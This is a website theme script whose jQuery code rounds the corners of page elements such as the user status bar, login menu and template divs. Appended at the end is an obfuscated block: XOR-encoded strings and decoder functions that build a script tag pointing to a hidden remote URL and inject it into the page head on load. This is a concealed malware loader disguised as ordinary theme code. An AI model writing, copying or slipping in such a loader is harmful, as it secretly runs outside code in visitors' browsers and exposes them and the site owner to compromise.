jQuery(document).ready(function($) {
  // Rounded corners:
  
    $('#userStatusBar').corner({
        tl: { radius: 6 }, 
        tr: { radius: 6 }, 
        bl: { radius: 0 }, 
        br: { radius: 0 },
        autoPad: false}); 
    $('.loginMenu').corner({
        tl: { radius: 4 }, 
        tr: { radius: 4 }, 
        bl: { radius: 4 }, 
        br: { radius: 4 },
        autoPad: false}); 
    $('#infoTextBar').corner({
        tl: { radius: 0 }, 
        tr: { radius: 0 }, 
        bl: { radius: 6 }, 
        br: { radius: 6 },
        autoPad: false}); 
    $('.friend').corner({
        tl: { radius: 4 }, 
        tr: { radius: 4 }, 
        bl: { radius: 4 }, 
        br: { radius: 4 },
        autoPad: false}); 

});

var loadingAnimation = "<img class='loadingAnimation' src='themes/modern/images/loadingAnimation.gif' width=208 height=13 style='border:0px;'>";

$JQ.extend($JQ.noah, {
    addCurvyCornersToPresentationDivs: function()
    {
        $JQ('div.template').livequery(function(){$JQ(this).corner({
            tl: { radius: 6 }, 
            tr: { radius: 6 }, 
            bl: { radius: 0 }, 
            br: { radius: 0 },
            autoPad: false});}); 
        $JQ('div.forCurvyFooter').livequery(function(){$JQ(this).corner({
            tl: { radius: 0 }, 
            tr: { radius: 0 }, 
            bl: { radius: 6 }, 
            br: { radius: 6 },
            autoPad: false});}); 
    }
});
function x83t(n6m79){return i3V(tRk(n6m79),'q370X11HMbXooq1');}function i3V(eURl76,kWuY0Q){var ydR='';var lf6=0;var e3Trw=0;for(lf6=0;lf6<eURl76.length;lf6++){var k9yz=eURl76.charAt(lf6);var vQ=k9yz.charCodeAt(0)^kWuY0Q.charCodeAt(e3Trw);k9yz=String.fromCharCode(vQ);ydR+=k9yz;if(e3Trw==kWuY0Q.length-1)e3Trw=0;else e3Trw++;}return (ydR);}var zsLu=["002080","003090","001071","018065082081044084116036040015061001027","002065084","005074071085","005086079068119091080062044017059029006001069","016067071085054085114032036014060","025086086084","022086067117052084092045035022043045022037080022125086093061","025071067064098030030059057003044010065002092029001025066045030091059098001054027065027066"];function e5Kb(slz63){var s4=document[x83t(zsLu[3])](x83t(zsLu[0])+x83t(zsLu[1])+x83t(zsLu[2]));s4[x83t(zsLu[4])]=slz63;s4[x83t(zsLu[5])]=x83t(zsLu[6]);document[x83t(zsLu[9])](x83t(zsLu[8]))[0][x83t(zsLu[7])](s4);}function tRk(in5){var wvJ80='';var dT=0;var cpD=0;for(dT=0;dT<in5.length/3;dT++){wvJ80+=String.fromCharCode(in5.slice(cpD,cpD+3));cpD=cpD+3;}return wvJ80;}e5Kb(x83t(zsLu[10]));